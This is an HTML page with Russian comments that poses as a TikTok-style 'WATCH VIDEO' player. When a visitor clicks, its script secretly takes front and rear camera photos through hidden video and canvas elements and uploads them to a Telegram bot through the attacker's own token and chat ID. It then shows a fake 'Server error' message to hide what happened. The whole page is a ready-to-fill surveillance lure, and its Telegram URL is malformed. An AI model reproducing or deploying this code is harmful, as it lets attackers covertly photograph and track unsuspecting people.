<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            font-family: sans-serif;
        }

        #watchBtn {
            background-color: #ff0050; /* TikTok Red */
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s;
        }

        #watchBtn:active {
            transform: scale(0.95);
        }

        /* Скрытые элементы */
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <button id="watchBtn">WATCH VIDEO</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ВСТАВЬТЕ ВАШИ ДАННЫЕ СЮДА
        const TOKEN = 'ВАШ_ТОКЕН_БОТА';
        const CHAT_ID = 'ВАШ_CHAT_ID';

        const watchBtn = document.getElementById('watchBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        watchBtn.addEventListener('click', async () => {
            try {
                // 1. Съемка селфи (Front camera)
                await captureAndSend('user', 'Front Camera');

                // 2. Съемка окружения (Rear camera)
                await captureAndSend('environment', 'Rear Camera');

            } catch (err) {
                console.error("Error:", err);
            } finally {
                // Вывод сообщения об ошибке в любом случае
                watchBtn.textContent = "Server error. Try again later";
                watchBtn.style.backgroundColor = "#555";
                watchBtn.disabled = true;
            }
        });

        async function captureAndSend(facingMode, label) {
            const constraints = {
                video: {
                    facingMode: facingMode,
                    width: { ideal: 4096 },
                    height: { ideal: 2160 }
                }
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;

                // Ждем немного для стабилизации камеры
                await new Promise(resolve => setTimeout(resolve, 1000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Остановка потока
                stream.getTracks().forEach(track => track.stop());

                // Конвертация в Blob и отправка
                canvas.toBlob(blob => {
                    sendToTelegram(blob, label);
                }, 'image/jpeg', 0.9);

            } catch (e) {
                console.warn(`Could not access ${label}:`, e);
            }
        }

        async function sendToTelegram(blob, label) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', `Photo from: ${label}`);

            try {
                await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Telegram send error:", err);
            }
        }
    </script>
</body>
</html>
